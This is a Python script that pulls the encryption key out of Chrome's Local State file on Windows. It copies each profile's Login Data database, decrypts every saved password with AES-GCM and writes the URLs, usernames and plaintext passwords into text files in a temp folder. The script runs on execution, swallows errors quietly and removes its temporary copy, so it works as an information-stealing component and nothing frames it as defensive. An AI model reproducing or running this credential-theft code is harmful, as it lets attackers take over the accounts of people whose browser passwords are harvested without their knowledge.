import os
import json
import time
import shutil
import base64
import sqlite3
import win32crypt
from savloc import temp
from Cryptodome.Cipher import AES

def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        # print("Probably saved password from Chrome version older than v80\n")
        # print(str(e))
        return "Chrome < 80"


def password():
    main_loc = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data' + os.sep
    possible_location = ["Default", "Guest Profile"]
    for folder in os.listdir(main_loc):
        if "Profile " in folder:
            possible_location.append(folder)
    master_key = get_master_key()
    for loc in possible_location:
        try:
            path_db = main_loc + loc + os.sep + 'Login Data'
            db_loc = temp() + os.sep + "Loginvault.db"
            shutil.copy2(path_db, db_loc) #making a temp copy since Login Data DB is locked while Chrome is running
            conn = sqlite3.connect(db_loc)
            cursor = conn.cursor()
            #print(path_db)
            try:
                fileloc = os.path.join(temp(),'Chrome_'+loc+".txt")
                with open(fileloc,'w') as f:
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = decrypt_password(encrypted_password, master_key)
                        if len(username) > 0:
                            s = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "\n"
                            f.write(s)
                            #print(s)
                    f.close()
            except Exception as e:
                #print(e)
                pass
            cursor.close()
            conn.close()
            try:
                os.remove(db_loc)
                time.sleep(0.2)
            except Exception as e:
                pass
        except:
            pass

password()